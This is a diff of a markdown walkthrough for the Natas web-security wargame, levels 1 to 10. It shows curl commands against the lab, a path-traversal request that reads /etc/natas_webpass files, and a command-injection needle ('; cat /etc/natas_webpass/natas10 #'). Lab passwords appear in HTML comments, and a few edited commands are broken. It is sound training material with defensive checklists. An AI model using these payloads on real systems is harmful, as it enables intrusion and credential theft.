@@ -1,6 +1,6 @@
 ---
 title: Natas
-description: Aimed at Beginners. Basic WebApp with a white box approch, showing of the most common bugs and how to abuse them.
+description: Aimed at Beginners. Basic WebApp with a white box approch, showcasing the most common bugs and how to abuse them.
 ---
 
 
@@ -99,11 +99,11 @@ since it is in the html file, as a comment.
 For all of that work for the curl request of level one, 
 there was an extra reward waiting for me on the second level. 
 The second flag sits at the exactly the same spot as the first. 
-The main difference is, that the option to view the source code in the brower is disabled. 
+The main difference is, that the option to view the source code in the browser is disabled. 
 Since I are yet to use a browser, that really doesn't matter for me. 
 
 ---
-
+ 
 <!--
 TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
 -->
@@ -123,7 +123,9 @@ A picture like that doesn’t belong in a challenge unless it’s trying to poin
 ### Following the Trail  
 Instead of looking at the picture itself, I cut it off at the directory and tried to see if `/files/` was open:  
 
-Codeblock with example here: curl -i -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/
+```bash
+curl -i -u natas2:natas2password http://natas2.natas.labs.overthewire.org/files/
+```
 
 And yes — Apache is happily showing me a directory listing.  
 Inside are two files:  
@@ -135,7 +137,9 @@ Inside are two files:
 ### The Jackpot – users.txt  
 Pulling `users.txt` gave me a list of dummy users, with one real gem tucked inside:  
 
-Codeblock with example here: curl -i -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt  
+```bash
+curl -i -u natas2password http://natas2.natas.labs.overthewire.org/files/users.txt  
+```
 
 In between fake creds like `alice` and `bob`, the entry for `natas3` stood out with the real password:  
 
@@ -161,7 +165,7 @@ It’s a rookie mistake, but one that still happens in real systems.
 Hitting the main page first:  
 
 ```bash
-curl -i -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/  
+curl -i -u natas3:natas3password http://natas3.natas.labs.overthewire.org/  
 ```
 
 The HTML looks empty except for a bold little comment:  
@@ -178,7 +182,7 @@ because that’s exactly how you tell Google (and other crawlers) to stay away.
 So the next step is to grab that file directly:  
 
 ```bash
-curl -i -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/robots.txt  
+curl -i -u natas3:natas3password http://natas3.natas.labs.overthewire.org/robots.txt  
 ```
 
 The response says:  
@@ -195,7 +199,7 @@ Bingo.
 Heading into the disallowed directory:  
 
 ```bash
-curl -i -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/  
+curl -i -u natas3:natas3password http://natas3.natas.labs.overthewire.org/s3cr3t/  
 ```
 
 This reveals an Apache directory listing with a single interesting file: `users.txt`.  
@@ -207,7 +211,7 @@ This reveals an Apache directory listing with a single interesting file: `users.
 One more curl to fetch that file directly:  
 
 ```bash
-curl -i -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt  
+curl -i -u natas3:natas3password http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt  
 ```
 
 Inside is the credential for the next level.  
@@ -238,7 +242,7 @@ This challenge stepped up from static file discovery into manipulating HTTP head
 The server blocked me by checking the **Referer header**, 
 insisting I could only come from `http://natas5.natas.labs.overthewire.org/`. 
 Instead of touching a browser, I kept things clean in curl 
-and controlling headers directly is actually quite easy and efficent.  
+and controlling headers directly is actually quite easy and efficient.  
 
 This is where the exercise really starts to feel like proper web hacking: 
 not clicking around, but shaping requests until the server bends.  
@@ -263,7 +267,7 @@ Curl lets me set or override headers with `-H`.
 So I added a Referer that matched exactly what the server wanted:  
 
 ```bash
-curl -u natas5:natas5password -H "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
+curl -u natas4:natas4password -H "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/
 ```
 
 ---
@@ -350,11 +354,13 @@ The goal of this level is to retrieve the password for the next level, **natas7*
 
 Accessing the level with basic authentication:
 
-Codeblock example here: curl -i -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/
+```bash
+curl -i -u natas6:natas6password http://natas6.natas.labs.overthewire.org/
+```
 
 Returns a page containing a simple form:
 
-```bash
+```html
 <form method=post> Input secret: <input name=secret><br> <input type=submit name=submit> </form>
 ```
 
@@ -365,16 +371,18 @@ Submissions are expected via POST with a field named `secret`.
 The level provides a link to the source code:
 
 ```bash
-curl -i -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/index-source.html
+curl -i -u natas6:natas6password http://natas6.natas.labs.overthewire.org/index-source.html
 ```
 
 Inspecting the source shows:
 
-Codeblock example here: <?php include "includes/secret.inc";
+```html
+<?php include "includes/secret.inc";
 if(array_key_exists("submit", $_POST)) { 
 if($secret == $_POST['secret']) { print "Access granted. 
     The password for natas7 is <censored>"; }
 else { print "Wrong secret"; } } ?>
+```
 
 ### Key Insight
 
@@ -401,7 +409,9 @@ Reveals:
 
 With `curl` we can emulate the form submission:
 
-Codeblock example here: curl -i -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" http://natas6.natas.labs.overthewire.org/
+```bash
+curl -i -u natas6:natas6password -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" http://natas6.natas.labs.overthewire.org/
+```
 
 
 ## Summary
@@ -416,9 +426,271 @@ This level demonstrates the importance of **source code exposure** and how form 
 <!--
 bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
 -->
+
+---
+
 ## Level 7 → Level 8
+
+### Level goal
+
+Read the password for `natas8` by manipulating the page include parameter.  
+What you should learn: 
+how unsanitized file-includes or direct `include` calls in PHP 
+can be abused with path traversal (LFI) to read arbitrary files on the server.
+
+### Short explanation of the vulnerability
+
+The app exposes a `page` parameter that the backend uses to include content. 
+If the parameter is concatenated into an include path without validation, 
+an attacker can supply traversal sequences (`../`) 
+to escape the webroot and include files like `/etc/natas_webpass/natas8`.
+
+### Step-by-step (what I ran and what the server returned)
+
+1) Inspect the page to see how it behaves
+
+```bash
+curl -i -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/
+```
+
+Server response (relevant parts):
+
+```html
+<h1>natas7</h1>
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</body>
+</html>
+```
+
+Observation: there is a `page` parameter used in links 
+and a comment explicitly pointing at `/etc/natas_webpass/natas8`. 
+That suggests the app includes files from `page`.
+
+2) Try path traversal to include the target file directly
+
+```bash
+curl -i -u natas7:natas7password "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8"
+```
+
+Server response (relevant part):
+
+```html
+<h1>natas7</h1>
+<div id="content">
+
+<a href="index.php?page=home">Home</a>
+<a href="index.php?page=about">About</a>
+natas8password
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+</div>
+```
+
+### Lessons learned (concise)
+
+- If user input controls include/require paths, attackers can traverse the filesystem and read sensitive files.  
+- LFI often reveals configuration files, password files, source code, or tokens stored outside webroot.  
+- Always validate and canonicalize requested paths, restrict includes to an allowlist, and never allow raw user input to drive filesystem includes.  
+- Limit the web process privileges so sensitive files like `/etc/natas_webpass/*` aren’t readable by the web user.
+
+### Quick defensive checklist for admins
+
+- Canonicalize and resolve include paths; reject any input that contains traversal.  
+- Use an allowlist of permitted page names (map short IDs to files, don't use raw filenames).  
+- Run web services with minimal privileges; protect sensitive files with strict permissions.  
+- Log suspicious include attempts and alert on repeated traversal patterns.
+
+---
+
+<!--
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+-->
+
+
 ## Level 8 → Level 9
+
+### Level goal  
+
+Read the password for `natas9` by reversing 
+the transformation the server performs on the submitted secret.  
+What you should learn: 
+how to reason about simple encoding pipelines (base64 → reverse → hex) 
+and how to invert them on the command line.
+
+### Short explanation of the vulnerability / challenge  
+
+The page accepts a `secret` via POST and runs a PHP function:
+
+`encodeSecret($secret) { return bin2hex( strrev( base64_encode($secret) ) ); }`
+
+The page compares the result against a hard-coded hex string. 
+If your submitted secret, after going through that pipeline, 
+matches the stored hex, the server prints the password for `natas9`. 
+Our task is to reverse the stored hex back to the original secret, then POST it.
+
+### Step-by-step (what I ran and what the server returned)
+
+1) Fetch the source to understand the transformation
+
+```bash
+curl -i -u natas8:natas8password http://natas8.natas.labs.overthewire.org/index-source.html
+```
+
+Server response (relevant excerpt):  
+the source shows the encoded value assigned to 
+`$encodedSecret:3d3d516343746d4d6d6c315669563362` and the function:
+`encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); }`
+
+Observation: the pipeline is clear. Hex of reversed(base64(secret)). 
+To find the correct `secret`, we reverse the pipeline: 
+hex → bytes → reverse → base64-decode → secret.
+
+2) Reverse the encoding on the CLI (exact reproducible command)
+
+```bash
+printf '%s' '3d3d516343746d4d6d6c315669563362' | xxd -r -p | rev | base64 -d; echo
+```
+
+What this does (concise):
+- `xxd -r -p` converts the hex string to raw bytes  
+- `rev` reverses the string  
+- `base64 -d` decodes base64 back to the original secret
+
+Expected output: `oubWYf2kBq`
+
+3) Verify by submitting the discovered secret via POST
+
+```bash
+curl -i -u natas8:natas8password -d "secret=oubWYf2kBq&submit=Submit" http://natas8.natas.labs.overthewire.org/
+```
+
+Server response (relevant part):  
+`Access granted. The password for natas9 is natas9password`
+
+Notes on reliable CLI usage:  
+
+- Use `printf '%s'` rather than `echo` to avoid accidental trailing newlines that break base64.  
+- `xxd -r -p` reverses hex to bytes; `xxd -p` prints hex.  
+- `rev` operates on the line contents and is perfect for `strrev` equivalents.  
+- If your environment lacks GNU `base64` flags, `openssl base64 -d` is an acceptable substitute.
+
+
+### Lessons learned (concise)
+
+- Encoding pipelines can be inverted by applying the inverse operations in reverse order. Think of the transform as a stack you pop in reverse.  
+- Understanding small building blocks (base64, string reversal, hex encoding) is high leverage — they show up in CTFs and real systems.  
+- CLI tools (xxd, rev, base64, Python) let you do what GUIs like CyberChef do — but faster, scriptable, and reproducible.
+
+### Quick defensive checklist for admins
+- Don’t rely on “obscurity by encoding” for security. Encoding is not encryption.  
+- If server logic depends on a secret comparison, keep secrets out of the source when possible and protect runtime files with strict permissions.  
+- Log and alert on suspicious repeated attempts to reverse-engineer or brute-force secret checks.
+
+---
+
+<!--
+ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+-->
+
+
 ## Level 9 → Level 10
+
+### Level goal
+
+Read the password for `natas10` by abusing command injection via a server-side call to `grep`.  
+What you should learn: 
+how unsanitized shell arguments passed to system utilities (passthru/exec)
+lead to command injection and how to exploit it from the CLI.
+
+### Short explanation of the vulnerability
+
+The page accepts a `needle` parameter 
+and then calls PHP's `passthru("grep -i $key dictionary.txt")`.  
+Because the value is interpolated directly into a shell command, 
+special characters let us break out of the grep command and chain arbitrary commands. 
+The web process runs the command and returns its stdout in the page, 
+so we can read files the web user can access.
+
+### Step-by-step (what I ran and what the server returned)
+
+**1) Inspect the page**
+
+```bash
+curl -u natas9:natas9password http://natas9.natas.labs.overthewire.org/
+```
+Relevant returned HTML shows a form:
+Output:
+
+```html
+<h1>natas9</h1>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+Output:
+<pre>
+</pre>
+```
+
+**2) Fetch the source to confirm the sink**
+
+```bash
+curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/index-source.html
+```
+
+Source (extracted and cleaned) shows the relevant PHP:
+
+```
+<? 
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+Observation: 
+The application directly feeds user input 
+into a shell command with no escaping. 
+That is the injection point.
+
+**3) Exploit command injection to read the next password**
+
+I crafted a needle that closes the grep command 
+and appends a shell command that cats the password file. 
+Example I used:
+
+```bash
+curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -d "needle=aa; cat /etc/natas_webpass/natas10 # " http://natas9.natas.labs.overthewire.org/
+```
+
+Server response (relevant part) shows the command output inside the page.
+Whit this I got the password for natas10 and cloud move on to the next level. 
+
+
+### Lessons learned (concise)
+
+- Never pass raw user input into shell commands. Use escapeshellarg/escapeshellcmd, or better yet avoid shelling out with user data.  
+- Command injection lets an attacker run arbitrary commands with the privileges of the web process. It is high severity and trivially exploitable when present.  
+- In CTFs and real apps, look for common sinks: `system`, `exec`, `passthru`, `shell_exec`, backticks, or any code that builds a shell string.
+
+### Quick defensive checklist for admins
+
+- Do not interpolate user input into shell commands. Use safe APIs or properly escape/validate input.  
+- Run the web process with minimal privileges and restrict filesystem access with file permissions.  
+- Use application-level allowlists for operations that need external utilities.  
+- Monitor logs for unusual shell invocation patterns and unexpected long or chained arguments.
+
+
+<!--
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+-->
+
 ## Level 10 → Level 11
 ## Level 11 → Level 12
 ## Level 12 → Level 13
